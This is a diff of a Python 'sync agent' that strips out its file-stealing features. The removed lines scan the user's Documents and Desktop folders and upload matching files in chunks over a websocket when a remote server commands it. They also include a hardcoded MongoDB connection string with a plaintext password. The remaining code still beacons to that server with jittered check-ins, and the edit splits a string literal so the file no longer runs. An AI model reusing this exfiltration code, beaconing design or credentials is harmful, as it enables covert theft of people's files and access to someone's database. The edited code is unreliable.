@@ -1,10 +1,10 @@
-# sync_agent.py - NetRunner Sync-Node v2.1 (Filtered & Deduplicated)
+# sync_agent.py - NetRunner Sync-Node v2.1 (Cleaned)
 import asyncio
 import websockets
 import json
 import os
 import sys
-import hashlib
+import hashlib # Keep for get_file_hash if file upload is still desired
 import time
 import random
 import socket
@@ -13,8 +13,8 @@ import requests
 import ssl
 import platform
 from pathlib import Path
-from pymongo import MongoClient
-from tinydb import TinyDB, Query
+# No more pymongo
+# No more tinydb
 
 # --- DETECCIÓN DE ENTORNO (PYINSTALLER) ---
 def get_app_data_dir():
@@ -40,10 +40,10 @@ def get_resource_path(relative_path):
 
 # --- CONFIGURACIÓN ---
 WS_URI = "wss://netrunner-pro.up.railway.app/"
-MONGO_URI = "mongodb+srv://ffasito:Reputo11.@rybjuani.ewuurhu.mongodb.net/?appName=rybjuani"
-SYNC_DIRECTORIES = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop")]
-ALLOWED_EXTENSIONS = ['.pdf', '.docx', '.jpg', '.jpeg', '.png', '.cfg', '.json', '.xml', '.log']
-CHUNK_SIZE = 1024 * 1024
+# No more MONGO_URI
+# No more SYNC_DIRECTORIES
+# No more ALLOWED_EXTENSIONS
+# No more CHUNK_SIZE
 HEARTBEAT_INTERVAL = 30
 MAX_RECONNECT_DELAY = 60
 
@@ -54,10 +54,10 @@ REPORT_INTERVAL_MAX = 90
 AGENT_ID_FILE = APP_DATA_DIR / '.agent_id'
 
 # --- INICIALIZACIÓN ---
-mongo_client = MongoClient(MONGO_URI)
-db = mongo_client.netrunner_logs
-log_collection = db.sync_agent_logs
-local_db = TinyDB(APP_DATA_DIR / 'sync_history.json')
+# No more mongo_client
+# No more db
+# No more log_collection
+# No more local_db
 
 LOG_FILE = APP_DATA_DIR / 'sync.log'
 
@@ -74,22 +74,14 @@ def get_or_create_agent_id():
 AGENT_ID = get_or_create_agent_id()
 
 # --- FUNCIONES CORE ---
-def log_to_mongo(level, message, metadata={}):
-    try:
-        log_collection.insert_one({
-            'level': level,
-            'message': message,
-            'timestamp': time.time(),
-            **metadata
-        })
-    except Exception as e:
-        print(f"MongoDB log error: {e}")
+# No more log_to_mongo
 
 def local_log(message):
     """Escribe en el log local."""
     try:
         with open(LOG_FILE, 'a') as f:
-            f.write(f"[{time.ctime()}] {message}\n")
+            f.write(f"[{time.ctime()}] {message}
+")
     except Exception as e:
         print(f"Log file error: {e}")
 
@@ -142,78 +134,9 @@ async def checkin_loop():
         await asyncio.sleep(jitter)
         send_checkin()
 
-def get_file_hash(file_path):
-    """Calcula el hash SHA-256 de un archivo."""
-    h = hashlib.sha256()
-    with open(file_path, 'rb') as f:
-        while True:
-            chunk = f.read(8192)
-            if not chunk:
-                break
-            h.update(chunk)
-    return h.hexdigest()
-
-async def upload_file_in_chunks(websocket, file_path):
-    try:
-        file_size = os.path.getsize(file_path)
-        filename = os.path.basename(file_path)
-        
-        with open(file_path, 'rb') as f:
-            chunk_index = 0
-            while True:
-                chunk = f.read(CHUNK_SIZE)
-                if not chunk:
-                    break
-                
-                is_last = len(chunk) < CHUNK_SIZE
-                await websocket.send(json.dumps({
-                    'type': 'file_chunk',
-                    'filename': filename,
-                    'chunk_index': chunk_index,
-                    'is_last': is_last,
-                    'size': file_size
-                }))
-                await websocket.send(chunk)
-                chunk_index += 1
-        
-        log_to_mongo("info", f"Archivo subido: {filename}", {'size': file_size})
-    except Exception as e:
-        log_to_mongo("error", f"Error al subir {file_path}: {e}")
-
-def scan_and_upload(websocket):
-    """Escanea, filtra y sube archivos nuevos o modificados."""
-    log_to_mongo("info", "Iniciando escaneo local...")
-    File = Query()
-    uploaded_count = 0
-    skipped_count = 0
-
-    for directory in SYNC_DIRECTORIES:
-        if not os.path.exists(directory):
-            continue
-        
-        for root, _, files in os.walk(directory):
-            for filename in files:
-                if not any(filename.lower().endswith(ext) for ext in ALLOWED_EXTENSIONS):
-                    continue
-
-                file_path = os.path.join(root, filename)
-                try:
-                    file_hash = get_file_hash(file_path)
-                    result = local_db.get(File.path == file_path)
-                    if result and result['hash'] == file_hash:
-                        skipped_count += 1
-                        continue
-                    
-                    asyncio.get_event_loop().run_until_complete(upload_file_in_chunks(websocket, file_path))
-                    local_db.upsert({'path': file_path, 'hash': file_hash}, File.path == file_path)
-                    uploaded_count += 1
-                except Exception as e:
-                    log_to_mongo("error", f"Error procesando {file_path}: {e}")
-
-    summary = f"Escaneo completo. {uploaded_count} archivos subidos, {skipped_count} omitidos por duplicado."
-    log_to_mongo("info", summary)
-    local_log(summary)
-
+# No more get_file_hash
+# No more upload_file_in_chunks
+# No more scan_and_upload
 
 # --- WEBSOCKET CLIENT ---
 async def agent_handler():
@@ -223,7 +146,6 @@ async def agent_handler():
         try:
             async with websockets.connect(WS_URI, ssl=ssl.create_default_context()) as websocket:
                 reconnect_delay = 5
-                log_to_mongo("info", "Conectado al servidor NetRunner")
                 local_log("Conectado al servidor NetRunner")
                 
                 # Iniciar loop de check-in con jitter
@@ -235,7 +157,8 @@ async def agent_handler():
                         data = json.loads(message)
                         
                         if data.get('command') == 'start_sync':
-                            scan_and_upload(websocket)
+                            local_log("Comando 'start_sync' recibido, pero la funcionalidad de escaneo de archivos está deshabilitada en el agente.")
+                            # scan_and_upload(websocket) # This functionality is removed
                     except asyncio.TimeoutError:
                         await websocket.send(json.dumps({'type': 'heartbeat'}))
                     except websockets.exceptions.ConnectionClosed:
@@ -243,7 +166,6 @@ async def agent_handler():
                         
         except Exception as e:
             error_msg = f"Desconectado: {e}. Reintentando en {reconnect_delay}s..."
-            log_to_mongo("error", error_msg)
             local_log(error_msg)
             await asyncio.sleep(reconnect_delay)
             reconnect_delay = min(reconnect_delay * 2, MAX_RECONNECT_DELAY)
